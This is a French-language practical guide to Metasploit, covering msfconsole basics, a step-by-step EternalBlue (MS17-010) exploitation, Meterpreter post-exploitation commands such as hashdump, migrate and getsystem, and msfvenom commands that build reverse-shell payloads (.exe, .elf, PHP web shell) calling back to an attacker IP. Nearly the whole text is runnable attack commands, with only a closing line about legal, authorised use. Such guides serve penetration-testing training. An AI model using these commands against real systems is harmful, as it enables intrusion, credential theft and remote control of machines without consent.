# 🎯 Metasploit : Le Guide Pratique

Metasploit est un framework complet pour le pentest. Il vous permet de trouver des vulnérabilités, d'exploiter des machines et de maintenir des accès. C'est un outil essentiel.

## 🚀 Démarrage et Commandes de Base

```bash
# Lance la console Metasploit. C'est votre interface principale.
msfconsole

# (Optionnel mais recommandé) Initialise la base de données pour la recherche.
msfdb init
```

Une fois dans `msfconsole`, voici les commandes que vous utiliserez tout le temps :

| Commande | Description |
|---|---|
| `search <terme>` | Cherche un exploit ou un module (ex: `search eternalblue`). |
| `use <module>` | Sélectionne un module à utiliser. |
| `info` | Affiche les détails du module sélectionné. |
| `show options` | Montre toutes les options à configurer (IP cible, port, etc.). |
| `set <OPTION> <VALEUR>` | Configure une option (ex: `set RHOSTS 192.168.1.10`). |
| `exploit` ou `run` | Lance l'attaque. |
| `sessions` | Gère vos sessions actives (shells, Meterpreter). |
| `back` | Revient en arrière. |

## 🔥 Workflow d'une Exploitation : de A à Z

Voici un exemple concret avec l'exploit EternalBlue (MS17-010).

1.  **Trouver l'exploit**
    ```bash
    msf6 > search ms17-010
    ```
2.  **Choisir le bon module**
    ```bash
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    ```
3.  **Configurer les options**
    - `RHOSTS` : L'IP de la **c**ible (Remote Host).
    - `LHOST` : **Votre** IP (Local Host), pour que la cible sache où se connecter en retour.
    ```bash
    msf6 exploit(...) > set RHOSTS 192.168.1.50
    msf6 exploit(...) > set LHOST 192.168.1.10
    ```
4.  **Lancer l'attaque**
    ```bash
    msf6 exploit(...) > exploit
    ```
    Si tout se passe bien, une session Meterpreter s'ouvrira !

## ⚡ Meterpreter : Votre Couteau Suisse en Post-Exploitation

Meterpreter est un "payload" avancé qui vous donne un contrôle quasi total sur la machine cible. Voici les premières choses à faire une fois que vous avez une session :

| Commande | Description |
|---|---|
| `sysinfo` | Affiche les infos du système (Windows, version, etc.). |
| `getuid` | Vous dit quel utilisateur vous êtes sur la machine. |
| `ps` | Liste les processus en cours. |
| `migrate <PID>` | Migre votre session dans un processus plus stable (comme `explorer.exe`). **Très recommandé !** |
| `hashdump` | Tente de récupérer les hashes des mots de passe Windows. |
| `shell` | Ouvre un shell Windows (`cmd.exe`) classique. |
| `screenshot` | Prend une capture d'écran de la machine cible. |
| `download <fichier>` | Télécharge un fichier de la cible vers votre machine. |
| `upload <fichier>` | Envoie un fichier de votre machine vers la cible. |

### Élever ses privilèges

Souvent, vous n'êtes qu'un simple utilisateur. La commande `getsystem` tente plusieurs techniques pour vous faire passer Administrateur ou `NT AUTHORITY\SYSTEM`.
```meterpreter
getsystem
```

## 💣 MSFvenom : Le Générateur de Payloads Autonome

`msfvenom` est l'outil qui accompagne Metasploit pour créer des charges utiles (ex: des `.exe` malveillants) que vous pouvez envoyer à vos cibles.

### Exemples de création de payloads

```bash
# Reverse shell Windows simple en .exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<VOTRE_IP> LPORT=4444 -f exe -o shell.exe

# Reverse shell Linux 64-bit en .elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<VOTRE_IP> LPORT=4444 -f elf -o shell.elf

# Payload web en PHP pour un serveur web compromis
msfvenom -p php/meterpreter_reverse_tcp LHOST=<VOTRE_IP> LPORT=4444 -f raw > shell.php
```

**Astuce :** Pour recevoir la connexion de ces payloads, utilisez le `multi/handler` dans Metasploit, configurez le même payload (`-p ...`) et les mêmes `LHOST`/`LPORT`, puis tapez `exploit`.

---
> ⚠️ **USAGE ÉTHIQUE** : Metasploit est un outil extrêmement puissant. Ne l'utilisez que dans un cadre légal et avec autorisation.